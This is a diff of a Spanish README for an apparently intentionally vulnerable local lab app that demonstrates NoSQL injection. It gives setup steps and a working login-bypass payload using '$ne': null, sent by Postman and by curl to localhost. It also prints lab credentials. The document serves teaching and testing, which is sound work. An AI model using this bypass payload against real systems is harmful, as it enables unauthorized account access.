@@ -1,55 +1,50 @@
-# NoSQL-Inyection
+NoSQL-Inyection
 
-## Instalación y Ejecución (Linux y Windows)
+INSTALACIÓN Y USO (en Linux o Windows)
 
-### 1. Clonar el repositorio
-Abre una terminal y ejecuta el siguiente comando:
-```sh
+Clona el repo
+Abre la terminal y escribe esto:
 git clone https://github.com/JavierNila/NoSQL-Inyection.git
 cd NoSQL-Inyection
-```
 
-### 2. Instalar dependencias
-Ejecuta el siguiente comando dentro de la carpeta del proyecto:
-```sh
+Instala lo que necesita
+Dentro de la carpeta del proyecto:
 npm install
 npm install cors
-```
-Esto instalará todas las dependencias necesarias definidas en `package.json`, incluyendo `cors` para evitar errores relacionados con políticas de seguridad del navegador.
+Eso va a bajar todas las cosas necesarias. El cors es para que el navegador no se queje.
 
-### 3. Ejecutar el servidor
-Inicia el backend con:
-```sh
+Corre el servidor
+Lánzalo con:
 node server.js
-```
-El servidor correrá en `http://localhost:3000`.
+Va a estar corriendo en http://localhost:3000
 
-### 4. Abrir el frontend
-- Abre el archivo `index.html` en el navegador.
+Abre el frontend
+Solo abre el archivo index.html en tu navegador. Ya con eso.
 
-## Uso de la Aplicación
-1. Ingresa un usuario y una contraseña en la interfaz web (`index.html`).
-2. Al presionar "Ingresar", el formulario enviará una solicitud `POST` al backend (`server.js`) en `http://localhost:3000/login`.
-3. Para probar la inyección NoSQL, se puede utilizar una herramienta como Postman o `curl`.
+CÓMO SE USA
 
-### Prueba con Postman
-- Abre Postman y crea una nueva solicitud `POST` a `http://localhost:3000/login`.
-- En el apartado "Body", selecciona "raw" y el tipo `JSON`.
-- Ingresa la siguiente carga útil:
-  ```json
-  {
-    "username": { "$ne": null },
-    "password": { "$ne": null }
-  }
-  ```
-- Envía la solicitud y verifica que la autenticación se realice sin credenciales válidas.
+Escribes un usuario y contraseña en la página (la de index.html)
 
-### Prueba con curl
-También puedes enviar la inyección desde la terminal con:
-```sh
+Le das a “Ingresar” y eso manda los datos al backend en http://localhost:3000/login
+
+Si quieres probar inyecciones NoSQL, puedes usar Postman o directamente desde la terminal con curl
+
+POSTMAN
+Abres Postman, haces un POST a http://localhost:3000/login
+Vas a “Body”, eliges “raw” y formato JSON
+Pegas esto:
+
+{
+  "username": { "$ne": null },
+  "password": { "$ne": null }
+}
+
+Y le das enviar. Deberías entrar sin usar credenciales reales.
+
+Si prefieres terminal, escribe esto:
 curl -X POST http://localhost:3000/login -H "Content-Type: application/json" -d '{"username": { "$ne": null }, "password": { "$ne": null }}'
-```
-Esto permitirá autenticarse sin credenciales válidas debido a la vulnerabilidad NoSQL Injection.
 
-## Nota Importante
-Las credenciales otorgadas (`username: student`, `password: dPgF0sb0ADBUZHCI`) no funcionan por razones desconocidas.
+Y listo, te deja entrar por la vulnerabilidad de NoSQL Injection.
+
+IMPORTANTE
+Las credenciales que nos otorgaron (username: student, password: dPgF0sb0ADBUZHCI) no funcionan
